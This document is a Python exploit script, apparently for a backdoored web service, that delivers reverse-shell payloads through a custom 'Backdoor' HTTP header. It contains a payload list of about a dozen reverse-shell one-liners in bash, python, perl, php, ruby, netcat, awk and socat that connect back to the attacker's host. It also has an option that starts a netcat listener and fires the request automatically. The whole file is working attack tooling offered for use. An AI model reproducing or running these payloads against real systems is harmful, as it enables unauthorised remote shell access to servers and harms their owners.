#!/usr/bin/python3
#incase the script didnt work for you or returned any /bin/sh related errors make sure to change your terminal emulator name down below
#change qterminal otherwise if you have kali linux its there by default
import socket 
import requests
import sys
import ipaddress
import subprocess
import concurrent.futures
import time
from colorama import Fore

def banner():
    font = """___  ___            _         ______               _         _                     
    |  \/  |           | |        | ___ \             | |       | |                    
    | .  . |  ___    __| |        | |_/ /  __ _   ___ | | __  __| |  ___    ___   _ __ 
    | |\/| | / _ \  / _` |        | ___ \ / _` | / __|| |/ / / _` | / _ \  / _ \ | '__|
    | |  | || (_) || (_| |        | |_/ /| (_| || (__ |   < | (_| || (_) || (_) || |   
    \_|  |_/ \___/  \__,_|        \____/  \__,_| \___||_|\_\ \__,_| \___/  \___/ |_|   
                       ______                                                      
                      |______|    """
    print(Fore.RED+font)

def check_connection(ip,port):
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect((ip,int(port)))
        s.close()
        return True
    except socket.error as e:
        return False
def is_valid_ip(ip):
    try:
        ipaddress.ip_address(ip)
        return True
    except ValueError:
        return False
def check_args():
    if len(sys.argv) > 2:  
        if is_valid_ip(sys.argv[1]):
            return True
        else:
            print("invalid IP")
            return False
    else:
        print("USAGE : ./exploit.py IP PORT REVPORT")
        return False
        sys.exit(1)
def valid_port(port):
    return 1 <= int(port) <= 65355
def run_command(command):
    subprocess.run(command, shell=True)


#Exploitation phase 
def exploit(Lhost,Lport,Revport):
    #Declaring variables and payloads
    Revhost = subprocess.check_output("ip route get 1 | awk '{print $7}'", shell=True).decode().strip()
    payloads = [f"nc -lnvp {Revport}",f"0<&196;exec 196<>/dev/tcp/{Revhost}/{Revport}; sh <&196 >&196 2>&196",
f"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{Revhost}",{Revport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'""",f"""perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{Revhost}:{Revport}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'""",
f"""php -r '$sock=fsockopen("{Revhost}",{Revport});exec("/bin/sh -i <&3 >&3 2>&3");'""",f"""php -r '$s=fsockopen("{Revhost}",{Revport});shell_exec("/bin/sh -i <&3 >&3 2>&3");'""",f'php -r \'$s=fsockopen("192.168.1.16",444);`/bin/sh -i <&3 >&3 2>&3`;\' ',f"""php -r '$sock=fsockopen("{Revhost}",{Revport}); $proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);'""",f"""ruby -rsocket -e'f=TCPSocket.open("{Revhost}",{Revport}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'""",f"""nc -e /bin/bash {Revhost} {Revport}""",f"""awk 'BEGIN {{s = "/inet/tcp/0/{Revhost}/{Revport}"; while(42) {{ do{{ printf "shell>" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != "exit") close(s); }}}}' /dev/null""",f"""socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{Revhost}:{Revport}"""]
    nshell=int(input("\n\n\nChoose The reverse shell 1-12 : "))
    if nshell == 0:
        payload = f'''{payloads[0]} '''
        print(payload)
    elif nshell == 1:
        payload = f'''{payloads[1]} '''
    elif nshell == 2:
        payload = f'''{payloads[2]} '''
    elif nshell == 3:
        payload = f'''{payloads[3]} '''
    elif nshell == 4:
        payload = f'''{payloads[4]} '''
    elif nshell == 5:
        payload = f'''{payloads[5]} '''
    elif nshell == 6:
        payload = f'''{payloads[6]} '''
    elif nshell == 7:
        payload = f'''{payloads[7]} '''
    elif nshell == 8:
        payload = f'''{payloads[8]} '''
    elif nshell == 9:
        payload = f'''{payloads[9]} '''
    elif nshell == 10:
        payload = f'''{payloads[10]} '''
    elif nshell == 11:
        payload = f'''{payloads[11]} '''
    elif nshell == 12:
        payload = f'''{payloads[12]} '''
    
    listener_cmd= f"nc -lnvp {Revport}"
    url = f'http://{Lhost}:{Lport}'
    headers = {
            "Backdoor": payload
            }
    #Checking for port validation
    if not valid_port(Lport) or not valid_port(Revport):
        print(Fore.RED+"Port Unreconized")
        sys.exit(1)
    #Perparing the automated reverse shell command
    
    print(Fore.GREEN+"Please select Option 1 Or 2")
    print(Fore.GREEN+"1) Fully automatic RCE (Works Only For ncat or php)\n 2) Manual RCE you have to set up the listener : ")
    choice = int(input(Fore.RED+"Choice : "))
    #Choosing between automated or manual Reverse shell
    if choice == 1:
        rev_cmd = ""
        if int(input("Rce with ncat Press 1 : \n Php Press 2 : ")) == 1:
            rev_cmd = f"python3 -c 'import requests; requests.get(\"{url}\", headers={{\"Backdoor\": \"nc -e /bin/bash {Revhost} {Revport}\"}})'"
        else:
            rev_cmd = f"python3 -c 'import requests; requests.get(\"{url}\", headers={{\"Backdoor\": \"php -r \\'$s=fsockopen(\\\"192.168.1.16\\\",444);`/bin/sh -i <&3 >&3 2>&3`\\';\"}})'"

        try:
            if check_connection(Lhost,Lport):
                print("Host Found")
                with concurrent.futures.ThreadPoolExecutor(max_workers=2) as executor:
                    executor.submit(run_command, f"qterminal -e {listener_cmd}")
                    time.sleep(2)
                    executor.submit(run_command, f"qterminal -e {rev_cmd}")
        except subprocess.CalledProcessError as e:
            print(f"An error occurred: {e}") 
    elif choice == 2:
        #Manual RCE
        if check_connection(Lhost,Lport):
            print(Fore.RED+f"Please Put This Command In Another Terminal : nc -lvp {Revport} ")
            req = requests.get(f'http://{Lhost}:{Lport}',headers=headers)
            print(Fore.GREEN+"Press Enter only if you set up the listener if you want to exit please type "+Fore.YELLOW+"exit")
            l = input(Fore.GREEN+"Press Enter : ") 
            while True:
                if l  == "":
                    exploit(Lhost,Lport,Revport)
                else:
                    if l.lower() == 'exit':
                       sys.exit(1) 
                    else:
                        l = input(Fore.GREEN+"Press Enter : ") 
def main():
    if check_args():
        exploit(sys.argv[1],sys.argv[2],sys.argv[3])

if __name__ == '__main__':
    banner()
    main()

